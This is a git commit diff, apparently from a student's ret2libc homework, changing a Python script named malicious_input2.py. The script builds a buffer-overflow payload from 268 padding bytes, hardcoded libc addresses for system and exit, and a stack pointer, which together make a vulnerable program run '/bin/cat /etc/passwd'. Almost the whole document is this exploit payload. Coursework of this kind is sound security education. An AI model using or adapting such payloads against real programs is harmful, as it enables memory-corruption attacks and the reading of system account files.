2bf1a114e452c3e8470a56b4d9b1cfa7b1714056
Lucas Gembarzewski <lgembarz@avalon.srcit.stevens-tech.edu>
2020-11-08 22:57:23 -0500

    finished

--- hw2-ret2libc/malicious_input2.py
+++ hw2-ret2libc/malicious_input2.py
@@ -1,8 +1,10 @@
-
+#import sys
 # overflow + addr of system + retaddr of system + addr of string + actual string
 
-exploit = b"A"*(268) + b"\xb0\x5d\xe4\xf7" + b"\xe0\x99\xe3\xf7" + b"\xa8\xd8\xff\xff" + "/bin/cat /etc/passwd\x00"
+exploit = b"A"*(268) + b"\xb0\x5d\xe4\xf7" + b"\xe0\x99\xe3\xf7" + b"\xa9\xd8\xff\xff" + b"\x01"  + b"/bin/cat /etc/passwd\x00"
 print exploit
 
-# this currently calls libc exit, but exits w status 57... we could also ask about returning to addr
-# in main where exit(0) is called?
+#payload = bytearray(exploit)
+
+#sys.stdout.buffer.write(payload)
+
